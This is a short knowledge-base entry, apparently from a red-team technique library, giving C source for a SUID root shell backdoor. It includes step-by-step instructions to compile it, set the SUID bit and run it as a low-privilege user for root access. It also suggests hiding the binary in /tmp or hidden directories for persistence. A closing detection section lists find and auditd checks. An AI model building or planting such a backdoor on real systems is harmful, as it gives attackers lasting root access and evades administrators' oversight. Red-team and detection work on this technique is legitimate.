---
id: code-001
name: C-SUID-Root-Shell-Program
type: code
language: C
verified: true
created_at: '2023-10-01T00:00:00.000000+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - suid
  - privilege-escalation
  - backdoor
validated: true
---

# C-SUID-Root-Shell-Program

## Code

```c
int main(void){
setresuid(0, 0, 0);
system("/bin/sh");
}
```

## Description

This C program is a minimal payload for a SUID root shell. When compiled into a binary and the SUID bit is set with root ownership, executing it as any user will set the effective UID to root (via setresuid) and spawn an interactive /bin/sh shell with root privileges. It is used in privilege escalation or persistence scenarios on Linux systems.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | No runtime variables; hardcoded to root UID (0) and /bin/sh | N/A |

## Usage

1. Save the code to a file (e.g., suid.c).
2. Compile as root: `gcc -o suid suid.c`.
3. Set permissions: `chmod u+s suid`.
4. Execute as low-priv user: `./suid` to get root shell.

Ideal for red team persistence after initial root access; place in accessible locations like /tmp or hidden dirs.

## Detection

- Scan for SUID binaries with unusual strings: `find / -perm -4000 -exec strings {} \; | grep -i sh`.
- Monitor gcc compilations and chmod u+s events via auditd.
- File integrity checks for new executables in /tmp.
- Runtime: Processes spawning sh from custom binaries (e.g., via procfs analysis).

## Related

- [[procedures/Linux-SUID-Privilege-Escalation-via-Custom-SetUID-Binary-Creation]]
- [[compile-suid-with-gcc]]
